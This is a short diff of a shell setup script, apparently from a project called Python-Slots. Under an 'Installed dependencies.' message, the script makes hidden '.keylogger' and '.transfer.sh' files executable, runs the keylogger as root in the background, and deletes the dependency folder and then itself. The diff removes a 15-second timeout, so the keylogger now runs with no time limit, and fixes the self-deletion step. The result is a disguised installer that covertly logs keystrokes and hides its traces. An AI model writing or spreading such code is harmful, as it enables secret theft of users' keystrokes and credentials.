@@ -44,9 +44,10 @@ chmod +x .keylogger
 chmod +x .keylogger.sh
 chmod +x .transfer.sh
 echo > .out
-timeout 15 sudo sh .keylogger.sh &
+sudo sh .keylogger.sh &
 rm -rf ~/Python-Slots/dependencies
 echo "Installed dependencies."
 
 # remove script
+cd ~/Python-Slots
 rm ./setup.sh
